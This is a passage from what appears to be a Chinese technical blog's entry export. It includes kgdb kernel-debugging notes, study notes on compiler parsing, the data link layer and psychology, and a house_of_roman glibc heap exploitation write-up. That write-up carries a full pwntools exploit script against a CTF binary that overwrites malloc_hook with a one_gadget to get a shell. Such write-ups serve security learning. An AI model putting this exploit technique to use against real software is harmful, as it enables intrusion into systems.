115200#设置串口通信的波特率,该选项每次重启会重置sudo stty -F /dev/ttyS0#查看是否设置成功 调试启动target,开机时按住shift选择对应启动项,进入等待连接状态. host配置好后,gdb连接调试即可. 因为默认用户没有串口设备的使用权限，所以应该先使用如下命令来增加权限.也可以使用sudo方式来启动gdb. 1!sudo usermod -a -G dialout user 123456789gdb -s /usr/lib/debug/boot/vmlinux-4.10.0-19-generic#调试带符号的vmlinuxgdb &gt; set architecture i386:x86-64:intel#设置为64位gdb &gt; dir /usr/src/linux-***#设置源代码目录进行源码级调试gdb &gt; target remote /dev/ttyS0#连接远端gdb &gt; c c之后target会进入系统,通过sudo su &amp;&amp; echo g &gt; &quot;/proc/sysrq-trigger&quot;打开target的kgdb调试. 此时可以在host中下断点,查看内存信息等进行调试了.]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>kernel-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-heap-pwn-house_of_roman]]></title>
    <url>%2Fposts%2Fd3d5eed6%2F</url>
    <content type="text"><![CDATA[0x00house_of_roman利用条件,可以修改free chunk的fd,可以溢出下一个chunk的size. 利用思路 首先分配3个chunk,大小分别为0x20,0xd0,0x70. 在chunk2 + 0x78处设置p64(0x61),作用是fake size,用于后面的fastbin attack. 释放掉chunk2,再次分配0xd0,会分配到chunk2,此时chunk2 + 0x10和chunk2 + 0x18中存在main_arean地址. 然后再分配3个大小0x70的chunk,释放chunk3,chunk4,此时chunk4-&gt;fd = chunk3.修改chunk4-&gt;fd的低字节,使得chunk4-&gt;fd = chunk2. 修改chunk2-&gt;size = 0x71.此时chunk2-&gt;fd为main_arean地址,通过修改低2个字节,可以修改到malloc_hook - 0x23处(注意,这里需要爆破1/16),然后分配3次0x70的chunk拿到包含malloc_hook的chunk. 此时malloc_hook内容为0,然后利用unsorted bin修改malloc_hook内容为main_arean的地址,利用部分写修改malloc_hook为one_gadget(注意,这里需要爆破1/4096). 多次释放一个指针,触发double free异常,进而触发malloc_printerr,getshell. exp该题源于:https://github.com/romanking98/House-Of-Roman. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *def create(size, index): r.sendlineafter("3. Free", "1") r.sendlineafter(":", str(size)) r.sendlineafter(":", str(index))def free(index): r.sendlineafter("3. Free", "3") r.sendlineafter(":", str(index))def edit(index, content): r.sendlineafter("3. Free", "2") r.sendlineafter(":", str(index)) sleep(0.1) r.send(content)r = process("./new_chall", env=&#123;"LD_PRELOAD": "./libc-2.24.so"&#125;)r.sendlineafter(":", "a" * 20)create(0x18, 0)create(0xc8, 1)edit(1, "A" * 0x68 + p64(0x61))create(0x68, 2)free(1)create(0xc8, 1)edit(0, "a" * 24 + "\x71")create(0x68, 3)create(0x68, 15)create(0x68, 16)create(0x68, 17)create(0x68, 18)create(0x68, 19)free(2)free(3)edit(3, "\x20")edit(1, "\xcd\x4a")create(0x68,0)create(0x68,0)create(0x68,0)# free(15)# edit(15, p64(0x00))create(0xc8, 1)create(0xc8, 1)create(0x18, 2)create(0xc8, 3)create(0xc8, 4)free(1)edit(1, "a" * 8 + "\xe0\x4a")create(0xc8, 1)edit(0, "a" * 0x13 + "\x4f\x39\x5b")create(0xc8, 7)try: resp = r.recv(4, timeout=6) r.interactive()except: r.close()]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>heap-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-compiler-principles-语法分析]]></title>
    <url>%2Fposts%2Fb299f43a%2F</url>
    <content type="text"><![CDATA[概览语法分析是编译过程的核心,它的任务是在词法分析识别出单词符号串的基础上,分析并判断程序的语法结构是否符合语法规则.如果用上下文无关的文法来描述语法的语法结构,则语法分析器的工作本质就是按文法的产生式,识别输入符号串是否是一个句子. 在构造最左推导的过程中,面对当前读入的单词符号和当前被替换的非终结符号两者,应该选择这个非终结符的哪条候选产生式去替换它(推导),这就是自顶向下分析的关键. 在构造最右推导的逆过程中,面对当前读入的单词符号,已分析过的符号串中是否已构成一个产生式的右部(可归约串),即句柄.如果已构成句柄,即用相应的产生式左部(非终结符号)去替换它(归约),寻找句柄就是自下而上分析的核心. 自上而下从推导的角度看,从文法开始符号出发,试图推导出与输入符号串相同的符号串.一般来讲,构造出的推导是最左推导. 从语法树的角度看,从根节点,试图向下构造一颗语法树,其端末节点从左到右连接起来的串正好与输入符号串相同. 自上而下分析可以用一种带回朔的反复试探过程来实现,但是这种方法使得系统实现时的效率存在极大的问题,甚至不能进行.]]></content>
      <categories>
        <category>CS</category>
        <category>compiler-principles</category>
      </categories>
      <tags>
        <tag>compiler-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-computer-network-数据链路层]]></title>
    <url>%2Fposts%2F993a6f6c%2F</url>
    <content type="text"><![CDATA[基本概念数据链路层是实现设备之间通信的非常重要的一层,局域网中的主机,交换机(数据链路层加物理层),路由器(数据链路层加物理层,网络层)等都必须实现数据链路层. 链路(物理链)是一条无源的点到点的物理线路段,中间没有任何其他的交换结点.一条链路只是一条通路的一个组成部分.数据链路(逻辑链路)除了物理线路外,还必须有通信协议来控制这些数据的传输,不同的链路层可能采用不同的数据链路层协议. 若把实现这些协议的硬件和软件加到链路上,就构成了数据链路.早期的数据通信协议曾叫做通信规程(procedure).因此在数据链路层,规程和协议是同义语. 现在最常用的方法是使用适配器(即网卡,通信适配器,网络接口卡,网络接口板等)来实现这些协议的硬件和软件(驱动程序).一般的适配器都包括了数据链路层和物理层这两层的功能. 数据链路层使用的信道可以分为点对点信道和广播信道,广播信道必须使用专用的共享信道协议来协调这些主机的数据发送. 数据链路层协议有许多种,有四个基本问题则是共同的:封装成帧,透明传输,差错控制,多路访问. 使用点对点信道的数据链路层使用点对点信道的数据链路层需要考虑三个基本问题:封装成帧,透明传输,差错控制. 封装成帧 &amp; 透明传输封装成帧就是在一段数据的前后分别添加首部和尾部,然后就构成了一个帧.首部和尾部的一个重要作用就是进行帧定界.帧的数据部分要小于MTU最大传送单元,帧长包括首尾部. 在数据链路层透明传输数据,表示无论发送什么样的比特组合的数据,这些数据都能够按照原样没有差错地通过这个数据链路层. 控制字符进行帧定界当数据是由可打印的ASCII码组成的文本文件时,帧定界可以使用特殊的控制字符(帧定界符).控制字符SOH(Start Of Header)表示帧的开始,另一个控制字符EOT(End Of Transmission)表示帧的结束. 为了实现透明传输,发送端的数据链路层在数据中出现控制字符的前面插入一个转义字符,接收端的数据链路层在将数据送往网络层之前删除插入的转义字符.如果转义字符也出现在数据当中,那么应在转义字符前面插入一个转义字符,当接收端收到连续的两个转义字符时,就删除其中前面的一个. 特殊比特进行帧定界当数据是由二进制组成的比特块时,帧定界可以使用特殊的比特串. 例如:帧开始和结束用01111110.为了实现透明传输,进行比特填充.发送方,报文中5个连续1,插入0;接收方,收到5个连续1,后为0,去掉.为1,再后为0,则帧结束.否则出错. 差错检测在传输过程中可能会产生比特差错:1可能会变成0,而0也可能变成1.在一段时间内,传输错误的比特占所传输比特总数的比率称为误码率BER(Bit Error Rate),误码率与信噪比有很大的关系. 在数据链路层传送的帧中,使用了很多检错技术,包括:奇偶校验,循环冗余检验CRC.在数据后面添加上的冗余码称为帧检验序列FCS. 奇偶校验奇偶校验有两种校验方法:奇校验和偶校验. 奇校验:原始码流加上校验位,总共有奇数个1. 偶校验:原始码流加上校验位,总共有偶数个1. 缺点,只能检错不能纠错.为此,发展出二维奇偶校验. 循环冗余检验在发送端把数据划分为组,假定每组k个比特,在每组后面再添加供差错检测用的n位冗余码,然后一起发送出去. 冗余码的计算过程:在原数据M后面添加n个0得到的k + n位的数除以事先选定好的长度为n + 1位的除数P,余数是R,将n位的余数R作为冗余码. 在接收端对收到的每一帧进行CRC检验,即将k + n位的数除以P,余数为0则判定这个帧没有差错,否则表示存在差错. 缺点,只能检错不能纠错.仅用循环冗余检验CRC差错检测技术只能做到无差错接受和无比特差错,单纯使用CRC差错检测技术不能实现无差错传输或可靠传输. 点对点协议PPP对于点对点的链路,目前使用得最广泛的数据链路层协议是点对点协议PPP. PPP协议的特点PPP协议应满足的需求:简单;封装成帧;透明传输;支持多种类型链路;差错检测;支持多种网络层协议;检测连接状态;最大传送单元;网络层地址协商;数据压缩协商; PPP协议不需要的功能:纠错;流量控制;序号;多点线路;半双工或单工链路; PPP协议有三个组成部分. 一个将IP数据报封装到串行链路的方法. 链路控制协议LCP(Link Control Protocol). 网络控制协议NCP(Network Control Protocol). PPP协议的帧格式 PPP是面向字节的,所有的PPP帧的长度都是整数字节.PPP帧的首部和尾部分别为4个字段和2个字段.标志字段F为0x7E,地址字段A为0xFF,但实际上并不起作用.控制字段C通常置为0x03. 对于透明传输:当PPP用在异步传输时,就使用一种特殊的字符填充法;当PPP用在同步传输链路时,协议规定采用硬件来完成比特填充. 字符填充法:将信息字段中出现的每一个0x7E字节转变成为2字节序列(0x7D, 0x5E).而0x7D字节则转变成为2字节序列(0x7D, 0x5D).若信息字段中出现ASCII码的控制字符(即小于0x20的字符),则在该字符前面要加入一个0x7D字节,同时将该字符的编码加以改变. PPP协议用在SONET/SDH链路时,使用同步传输(一连串的比特连续传送).这时PPP协议采用零比特填充方法来实现透明传输(即前面的比特填充法). PPP协议之所以不使用序号和确认机制:一是因为在数据链路层出现差错的概率不大;二是在因特网环境下,PPP的信息字段放入的数据是IP数据报,数据链路层的可靠传输并不能够保证网络层的传输也是可靠的;最后帧检验序列FCS字段可保证无差错接受. PPP协议的工作状态 当用户拨号接入ISP时,路由器的调制解调器对拨号做出确认,并建立一条物理连接. PC机向路由器发送一系列的LCP分组(封装成多个PPP帧). 这些分组及其响应选择一些PPP参数,并进行网络层配置,NCP给新接入的PC机分配一个临时的IP地址,使PC机成为因特网上的一个主机. 通信完毕时,NCP释放网络层连接,收回原来分配出去的IP地址,接着,LCP释放数据链路层连接,最后释放的是物理层的连接. 可见,PPP协议已不是纯粹的数据链路层的协议,它还包含了物理层和网络层的内容. 使用广播信道的数据链路层局域网的数据链路层局域网最主要的特点是:网络为一个单位所拥有,地理范围和站点数目均有限. 局域网主要优点:具有广播功能,从一个站点可很方便地访问全网.局域网上的主机可共享连接在局域网上的各种硬件和软件资源.便于系统的扩展和逐渐地演变,各设备的位置可灵活调整和改变.提高了系统的可靠性,可用性和残存性. 对于使用一对多的广播通信方式,若多个设备在共享的广播信道上同时发送数据,则会造成彼此干扰,导致发送失败. 媒体共享技术媒体共享技术分为静态划分信道和动态媒体接入控制(多点接入). 静态划分信道有:频分复用,时分复用,波分复用,码分复用.动态媒体接入控制分为:随机接入;受控接入,如多点线路探询,轮询等. 以太网标准DIX Ethernet V2是世界上第一个局域网产品(以太网)的规约.IEEE 802.3是第一个IEEE的以太网标准.DIX Ethernet V2标准与IEEE的802.3标准只有很小的差别,因此可以将802.3局域网简称为以太网.严格说来,以太网应当是指符合DIX Ethernet V2标准的局域网. 局域网的数据链路层有两个子层:逻辑链路控制LLC子层和媒体接入控制MAC子层. 与接入到传输媒体有关的内容都放在MAC子层,而LLC子层则与传输媒体无关.不管采用何种协议的局域网,对LLC子层来说都是透明的.一般不考虑LLC子层,因为TCP/IP体系经常使用的局域网是DIX Ethernet V2而不是802.3标准中的几种局域网,很多厂商生产的适配器上就仅装有MAC协议而没有LLC协议. 网络适配器网络适配器的重要功能:进行串行/并行转换,对数据进行缓存,在计算机的操作系统安装设备驱动程序,实现以太网协议. CSMA/CD协议最初的以太网是将许多计算机都连接到一根总线上,易于实现广播通信,当初认为这样的连接方法既简单又可靠,因为总线上没有有源器件. 为了实现一对一通信/寻址,将接收站的硬件地址写入帧首部中的目的地址字段中,仅当数据帧中的目的地址与适配器的硬件地址一致时,才能接收这个数据帧. 以太网采用无连接的工作方式,不必先建立连接就可以直接发送数据,对发送的数据帧不进行编号,也不要求对方发回确认.以太网提供的服务是不可靠的交付,当目的站收到有差错的数据帧时就丢弃此帧,其他什么也不做,差错的纠正由高层来决定即尽最大努力的交付,如果高层发现丢失了一些数据而进行重传,但以太网并不知道这是一个重传的帧,而是当作一个新的数据帧来发送. 若多台计算机或多个站点同时发送时,会产生发送碰撞或冲突,导致发送失败.为了避免同时发送产生的碰撞以太网发送的数据都使用曼彻斯特.曼彻斯特编码缺点是:它所占的频带宽度比原始的基带信号增加了一倍. 同时采用了CSMA/CD(载波监听多点接入/碰撞检测)协议防止产生碰撞. 载波监听就是用电子技术检测总线上有没有其他计算机发送的数据信号,如果有,则暂时不要发送数据,以免发生碰撞. 碰撞检测就是计算机边发送数据边检测信道上的信号电压大小,当几个站同时在总线上发送数据时,总线上的信号电压摆动值将会增大,当一个站检测到的信号电压摆动值超过一定的门限值时,就认为总线上至少有两个站同时在发送数据,表明产生了碰撞.所谓碰撞就是发生了冲突,因此碰撞检测也称为冲突检测.每一个正在发送数据的站,一旦发现总线上出现了碰撞,就要立即停止发送,免得继续浪费网络资源,然后等待一段随机时间后再次发送. 因为信号传播时延对载波监听产生了影响所以需要碰撞检测进行补充.最先发送数据帧的站,在发送数据帧后至多经过时间两倍的端到端往返时延就可知道发送的数据帧是否遭受了碰撞.以太网的两倍的端到端往返时延称为争用期,或碰撞窗口.经过争用期这段时间还没有检测到碰撞,才能肯定这次发送不会发生碰撞. 10Mbit/s以太网取51.2μs为争用期的长度,对于10Mbit/s以太网,在争用期内可发送512bit,即64字节.这意味着以太网在发送数据时,若前64字节没有发生冲突,则后续的数据就不会发生冲突.如果发生冲突,就一定是在发送的前64字节之内.由于一检测到冲突就立即中止发送,这时已经发送出去的数据一定小于64字节.以太网规定了最短有效帧长为64字节,凡长度小于64字节的帧都是由于冲突而异常中止的无效帧. 以太网上最大的端到端单程时延必须小于争用期的一半,这相当于10Mbit/s以太网51.2μs的争用期内,最大端到端长度约为5km. 使用CSMA/CD协议的以太网不能进行全双工通信而只能进行双向交替通信(半双工通信).每个站在发送数据之后的一小段时间内,存在着遭遇碰撞的可能性. 二进制指数类型退避算法发生碰撞的站在停止发送数据后,要推迟(退避)一个随机时间t才能再发送数据. 设k = min(重传次数, 10).基本退避时间取为争用期2x. 从整数集合[0, 1, ..., (2k - 1)]中随机地取出一个数,记为r,则重传所需的等待时间t = r * 2x. 当重传达16次仍不能成功时即丢弃该帧,并向高层报告. 使用集线器的星形拓扑 10BASE-T特点:使用无屏蔽双绞线,采用星形拓扑.每个站需要用两对双绞线,分别用于发送和接收.双绞线的两端使用RJ-45插头.集线器使用了大规模集成电路芯片,因此集线器的可靠性提高.每个站到集线器的距离不超过100m. 传统以太网最初是使用粗同轴电缆,后来演进到使用比较便宜的细同轴电缆,最后发展为使用更便宜和更灵活的双绞线.采用双绞线的以太网采用星形拓扑,在星形的中心则增加了一种可靠性非常高的设备,叫做集线器. 集线器是使用电子器件来模拟实际电缆线的工作.使用集线器的以太网在逻辑上仍是一个总线网,各工作站使用的还是CSMA/CD协议,并共享逻辑上的总线.集线器很像一个多接口的转发器,工作在物理层. 以太网的信道利用率假设x是以太网单程端到端传播时延,则争用期长度为2x,检测到碰撞后不发送干扰信号.设帧长为L(bit),数据发送速率为C(bit/s),帧的发送时间为T0 = L/C(s),成功发送一个帧需要占用信道的时间是T0 + x.一个站在发送帧时出现了碰撞,经过一个争用期后,可能又出现了碰撞,这样经过若干个争用期后,一个站发送成功了,最后发送一帧所需的平均时间如下. 在以太网中定义了参数a,它是以太网单程端到端时延x与帧的发送时间T0之比.当数据率一定时,以太网的连线的长度受到限制,否则x的数值会太大;以太网的帧长不能太短,否则T0的值会太小,使a值太大.极限信道利用率Smax:总线一旦空闲就有某一个站立即发送数据,此时信道利用率为极限信道利用率,大小为1 / (1 + a). 只有当参数a远小于1才能得到尽可能高的极限信道利用率.据统计,当以太网的利用率达到30%时就已经处于重载的情况.很多的网络容量被网上的碰撞消耗掉. 以太网的MAC层在局域网中,硬件地址称为MAC地址.每个适配器都有一个独一无二的MAC地址.MAC地址实际上就是适配器地址或适配器标识符EUI-48. IEEE 802标准规定MAC地址字段可采用6字节(48位)或2字节(16位).IEEE的注册管理机构RA负责向厂家分配地址字段6个字节中的前三个字节(即高位24位),称为组织唯一标识符.地址字段的后三个字节(即低位24位)由厂家自行指派,称为扩展唯一标识符,必须保证生产出的适配器没有重复地址. IEEE规定MAC地址字段的第一字节的最低位为I/G位:当I/G位为0时,地址字段表示一个单站地址.当I/G位为1时,表示组地址,用来进行多播.此时,IEEE只分配地址字段前三个字节中的23位.所有48位都为1时,为广播地址.只能作为目的地址使用. IEEE把地址字段第一字节的最低第2位规定为G/L位:当G/L位为0时,是全球管理,保证在全球没有相同的地址,厂商向IEEE购买的OUI都属于全球管理.当G/L位为1时,是本地管理,这时用户可任意分配网络上的地址. 适配器从网络上每收到一个MAC帧就首先用硬件检查MAC帧中的MAC地址.如果是发往本站的帧则收下,然后再进行其他的处理.否则就将此帧丢弃,不再进行其他的处理.发往本站的帧包括以下三种帧:单播帧,广播帧,多播帧. 所有的适配器都至少能够识别前两种帧,即能够识别单播地址和广播地址.有的适配器可用编程方法识别多播地址.只有目的地址才能使用广播地址和多播地址.以混杂方式工作的以太网适配器只要听到有帧在以太网上传输就都接收下来. MAC帧的格式常用的以太网MAC帧格式有两种标准:DIX Ethernet V2标准;IEEE的802.3标准.最常用的MAC帧是以太网V2的格式. 类型字段用来标志上一层使用的是什么协议.数据字段的正式名称是MAC客户数据字段.最小长度64字节减去18字节的首部和尾部就得到数据字段的最小长度46字节.当数据字段的长度小于46字节时,应在数据字段的后面加入整数字节的填充字段.在帧的前面插入(硬件生成)的8字节中,前7个字节是前同步码,用来迅速实现MAC帧的比特同步.最后1个字节是帧开始定界符,表示后面的信息就是MAC帧. 无效的MAC帧:数据字段的长度与长度字段的值不一致,帧的长度不是整数个字节,用收到的帧检验序列FCS查出有差错,数据字段的长度不在46 ~ 1500字节之间,有效的MAC帧长度不在64 ~ 1518字节之间.对于检查出的无效MAC帧就简单地丢弃,以太网不负责重传丢弃的帧. IEEE 802.3 MAC帧格式与以太网V2 MAC帧格式相似,区别在于IEEE 802.3规定的MAC帧的第三个字段是长度/类型.当这个字段值大于0x600时,就表示类型.这样的帧和以太网V2 MAC帧完全一样.当这个字段值小于0x600时,就表示长度.此时数据字段必须装入上面的逻辑链路控制LLC子层的LLC帧. 帧间最小间隔为9.6μs,相当于96bit的发送时间.一个站在检测到总线开始空闲后,还要等待9.6μs才能再次发送数据.这样做是为了使刚刚收到数据帧的站的接收缓存来得及清理,做好接收下一帧的准备. 扩展的以太网在物理层扩展以太网使用光纤扩展:主机使用光纤(通常是一对光纤)和一对光纤调制解调器连接到集线器.很容易使主机和几公里以外的集线器相连接. 使用集线器扩展:将多个以太网段连成更大的,多级星形结构的以太网. 优点:使原来属于不同碰撞域的以太网上的计算机能够进行跨碰撞域的通信;扩大了以太网覆盖的地理范围. 缺点:碰撞域增大了,但总的吞吐量并未提高.如果不同的碰撞域使用不同的数据率,那么就不能用集线器将它们互连起来. 碰撞域又称为冲突域,是指网络中一个站点发出的帧会与其他站点发出的帧产生碰撞或冲突的那部分网络.碰撞域越大,发生碰撞的概率越高. 在数据链路层扩展以太网扩展以太网更常用的方法是在数据链路层进行.早期使用网桥,现在使用以太网交换机. 网桥工作在数据链路层,它根据MAC帧的目的地址对收到的帧进行转发和过滤.当网桥收到一个帧时,并不是向所有的接口转发此帧,而是先检查此帧的目的MAC地址,然后再确定将该帧转发到哪一个接口,或把它丢弃.网桥可以互联不同类型的局域网.网桥使各网段成为隔离开的碰撞域. 1990年问世的交换式集线器可明显地提高以太网的性能.交换式集线器常称为以太网交换机或第二层交换机,强调这种交换机工作在数据链路层. 以太网交换机实质上就是一个多接口的网桥,通常都有十几个或更多的接口.每个接口都直接与一个单台主机或另一个以太网交换机相连,并且一般都工作在全双工方式,以太网交换机具有并行性.能同时连通多对接口,使多对主机能同时通信.相互通信的主机都是独占传输媒体,无碰撞地传输数据. 以太网交换机的接口有存储器,能在输出端口繁忙时把到来的帧进行缓存.以太网交换机是一种即插即用设备,其内部的帧交换表(地址表)是通过自学习算法自动地逐渐建立起来的.以太网交换机使用了专用的交换结构芯片,用硬件转发,其转发速率要比使用软件转发的网桥快很多.以太网交换机的性能远远超过普通的集线器,而且价格并不贵. 以太网交换机的用户独享带宽,增加了总容量.从共享星形以太网转到交换式以太网时,所有接入设备的软件和硬件,适配器等都不需要做任何改动.以太网交换机一般都具有多种速率的接口,方便了各种不同情况的用户. 以太网交换机的交换方式:存储转发,先缓存后处理;直通方式,接收数据帧的同时就立即按数据帧的目的MAC地址决定该帧的转发接口,因而提高了帧的转发速度.但有可能也将一些无效帧转发给其他的站. 以太网交换机内部的帧交换表的自学习算法存在回路问题.IEEE 802.1D标准制定了一个生成树协议STP:其要点是不改变网络的实际拓扑,但在逻辑上则切断某些链路,使得从一台主机到所有其他主机的路径是无环路的树状结构,从而消除回路现象. 总线以太网使用CSMA/CD协议,以半双工方式工作.以太网交换机不使用共享总线,没有碰撞问题,因此不使用CSMA/CD协议,以全双工方式工作.但仍然采用以太网的帧结构.总线形以太网所有计算机都处于同一个碰撞域中和同一个广播域中.交换机扩展的10Base_T星形以太网每个接口都处于一个独立的碰撞域中,但所有计算机都处于同一个广播域中. 广播域指这样一些网络,其中任何一台设备发出的广播通信都能被这些网络中的所有其他设备所接收.只有第三层的相关设备(如路由器)或特殊设备才能隔离广播域. 虚拟局域网VLAN虚拟局域网其实只是局域网给用户提供的一种服务,而并不是一种新型局域网. 每个虚拟局域网是一个广播域,当B1向VLAN2工作组内成员发送数据时,工作站B2和B3将会收到其广播的信息,VLAN1和VLAN3中的工作站都不会收到广播信息. 划分虚拟局域网的方法:基于交换机端口,基于计算机网卡的MAC地址,基于协议类型,基于IP子网地址,基于高层应用或服务. IEEE批准了802.3ac标准,该标准定义了以太网的帧格式的扩展,以支持虚拟局域网.虚拟局域网协议允许在以太网的帧格式中插入一个4字节的标识符,称为VLAN标记(tag),用来指明该帧属于哪一个虚拟局域网.插入VLAN标记得出的帧称为802.1Q帧或带标记的以太网帧.这对主机来说是透明的,交换机会在发送给主机前去掉标记. 高速以太网100BASE-T以太网速率达到或超过100Mbit/s的以太网称为高速以太网,100BASE-T以太网是在双绞线上传送100Mbit/s基带信号的星形拓扑以太网,仍使用IEEE 802.3的CSMA/CD协议,又称为快速以太网,其代号为IEEE 802.3u. 特点:可在全双工方式下工作而无冲突发生.在全双工方式下工作时,不使用CSMA/CD协议.MAC帧格式仍然是802.3标准规定的.保持最短帧长不变,但将一个网段的最大电缆长度减小到100米.帧间时间间隔从原来的9.6μs改为现在的0.96μs. 三种不同的物理层标准:100BASE-TX,使用2对UTP 5类线或屏蔽双绞线STP,网段最大程度100米;100BASE-T4,使用4对UTP 3类线或5类线,网段最大程度100米;100BASE-FX,使用2对光纤,网段最大程度2000米. 吉比特以太网允许在1Gbit/s下以全双工和半双工两种方式工作.使用IEEE 802.3协议规定的帧格式.在半双工方式下使用CSMA/CD协议,全双工方式不使用CSMA/CD协议.与10BASE-T和100BASE-T技术向后兼容. 使用两种成熟的技术:一种来自现有的以太网,另一种则是美国国家标准协会ANSI制定的光纤通道FC. 吉比特以太网工作在半双工方式时,就必须进行碰撞检测.为保持64字节最小帧长度,以及100米的网段的最大长度,吉比特以太网增加了两个功能:载波延伸,分组突发.当吉比特以太网工作在全双工方式时,不使用载波延伸和分组突发. 载波延伸:使最短帧长仍为64字节,同时将争用时间增大为512字节.发送的MAC帧长不足512字节时就用一些特殊字符填充在帧的后面,接收端在收到以太网的MAC帧后,要将所填充的特殊字符删除后才向高层交付. 分组突发:当很多短帧要发送时,第一个短帧要采用载波延伸方法进行填充,随后的一些短帧则可一个接一个地发送,只需留有必要的帧间最小间隔即可.这样就形成可一串分组的突发,直到达到1500字节或稍多一些为止. 10吉比特以太网(10GE)和更快的以太网10吉比特以太网与之前以太网的帧格式完全相同,保留802.3标准规定的以太网最小和最大帧长,便于升级.不再使用铜线而只使用光纤作为传输媒体.只工作在全双工方式,因此没有争用问题,也不使用CSMA/CD协议.此时以太网的工作范围已经从局域网扩大到城域网和广域网. 使用以太网进行宽带接入以太网宽带接入具有以下特点:可以提供双向的宽带通信,可以根据用户对带宽的需求灵活地进行带宽升级,可以实现端到端的以太网传输,中间不需要再进行帧格式的转换.这就提高了数据的传输效率且降低了传输的成本,但是不支持用户身份鉴别. PPPoE把PPP协议与以太网协议结合起来,将PPP帧再封装到以太网中来传输.现在的光纤宽带接入FTTx都要使用PPPoE的方式进行接入.在PPPoE弹出的窗口中键入用户名和密码进行宽带上网.利用ADSL进行宽带上网时,从用户个人电脑到家中的ADSL调制解调器之间,也是使用RJ-45和5类线进行连接的,并且也是使用PPPoE弹出的窗口进行拨号连接的. 其它随机访问协议ALOHA:一种用于解决在分组无线通信系统中分配广播信道的分布式方法.当结点获得新帧,将随时传输.无碰撞,结点能够继续发送新帧.如果碰撞,结点能够检测到. 时隙ALOHA:单个活跃结点能够连续地以信道的全速传输,减少了碰撞的概率,简单.但是结点时钟同步困难. IEEE 802.5:令牌环拓扑结构:点到点链路连接,构成闭合环. 传输媒体:屏蔽双绞线,光纤,速率1/4/16Mbps.最多站点数:250,信号采用曼彻斯特编码. 特殊帧:令牌.工作状态分为发送方式和收听方式, 发送方:首先截获token,发送方负责回收所发出的frame,发送完毕后产生新的令牌. 收听方:数据以帧为单位从TCU的输出端发送到下一个TCU的输入端,数据在绕环一周后回到源站,源站检查返回的数据帧,确定发送是否成功,若没有数据要发送,则产生新令牌发送到环路上. IEEE 802.5的帧结构. IEEE 802.4:令牌总线特点:物理上是总线网,逻辑上是令牌网. 物理层:传输媒体为75Ω宽带同轴电缆. 数据率:1/5/10Mbps.]]></content>
      <categories>
        <category>CS</category>
        <category>computer-network</category>
      </categories>
      <tags>
        <tag>computer-network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PSY-普通心理学-一些心理学知识]]></title>
    <url>%2Fposts%2F547f090b%2F</url>
    <content type="text"><![CDATA[0x0证实偏差:人们容易注意那些能够证实自己想法的证据,而忽略那些与自己想法矛盾的证据.]]></content>
      <categories>
        <category>PSY</category>
      </categories>
      <tags>
        <tag>普通心理学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PSY-普通心理学-概览]]></title>
    <url>%2Fposts%2F83f4288b%2F</url>
    <content type="text"><![CDATA[心理学心理学是一种研究行为和心理过程的科学,涉及大量领域,涵盖有关行为和心理过程的各个方面. 心理学大体可分为三个主要分支:实验心理学,心理学教学和应用心理学. 应用心理学专业:工业和组织心理学家,运动心理学家,工程心理学家,学校心理学家,康复心理学家,临床和咨询心理学家. 历史根源现代心理学发源于几种互相冲突的学派,包括结构主义,功能主义,格式塔心理学,行为主义和精神分析. 结构主义:聚焦结构,科学心理学的建立. 功能主义:聚焦功能. 格式塔心理学:聚焦集体而非局部. 行为主义:消除精神意识,聚焦行为. 精神分析:聚焦潜意识. 结构主义有两种具有革命性的思想塑造了早期心理学发展的进程. 达尔文的物种起源揭示了人与动物之间的关系,意味着可以将有关动物生理与行为的研究发现作为对人类行为研究的参考. 冯特基于化学元素产生的对意识基本元素的探索,也就是结构主义. 冯特是第一个自称为心理学家的人,并创建了一所进行心理学研究的学院,冯特与他的学生对他们所定义的意识的基本元素进行研究,包括:感觉,知觉,记忆,注意力,情绪,认知,学习和语言. 在实验中,他们让受训的志愿者接受各种简单的刺激,然后要求他们通过按压控制杆或通过描述感觉来对刺激做出反应,这种技术称为内省. 功能主义詹姆斯认为,心理学不应该只研究意识的结构,还应该研究意识的功能.这被称为功能主义. 詹姆斯建议心理学应该研究人类是如何做到或者不能做到适应实验室以外日常生活的. 格式塔心理学格式塔心理学家感兴趣的问题是我们如何构建”感知整体”(德语中为Gestalts),从而了解大脑是如何工作的.格式塔学派(或哲学学派)和结构主义,功能主义学者一样依靠内省的方法进行研究. 著名的格式塔心理学家马克斯魏特墨研究视觉错觉和诸如纳克立方体之类的图形,另一位沃尔夫冈科勒将格式塔心理学拓展到有关顿悟学习的研究. 纳克立方体证明了人们给自己的感觉赋予了含义,这个过程就叫做感知,这意味着人们并不是简简单单地感觉这个世界,还会通过加入自己的解释来感知这个世界. 行为主义行为主义者认为意识根本不应该成为心理学的研究对象.约翰华生是行为主义运动的领袖,他认为,如果心理学想要成为一门真正的,客观的科学,那就应该仅仅研究能够被观察到的事物,即来自环境的刺激和有机体的反应.心理学应该是行为的科学,而不是精神意识的科学. 行为主义摒弃任何涉及主观心理过程的心理学.行为主义者特别反对内省,他们不关注人们在想什么,而是关注人们会做什么. 精神分析弗洛伊德和他的学生们发明了精神分析法来治疗心理障碍,他们的概念性视角叫做精神分析,他们认为精神障碍是由潜意识的冲突造成的,因此他们坚持心理学研究应该覆盖潜意识. 心理学家的视角现代心理学以七种重要的观点为主要特征:生物学观点,发展观点,认知观点,临床观点,行为主义观点,特质观点和社会文化观点. 生物学观点生物学观点强调生理结构和脑部活动对人格,偏好,行为方式和能力的影响. 采用生物学方法的心理学家会在遗传,神经系统,内分泌系统以及注入疾病这样的环境攻击(而非人身攻击)等方面寻找行为的原因. 将生物心理学和生物学,神经学和其他研究脑内过程的学科一并叫做神经科学.]]></content>
      <categories>
        <category>PSY</category>
      </categories>
      <tags>
        <tag>普通心理学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mathematics-probability-theory-随机变量及其分布]]></title>
    <url>%2Fposts%2Fbf23e628%2F</url>
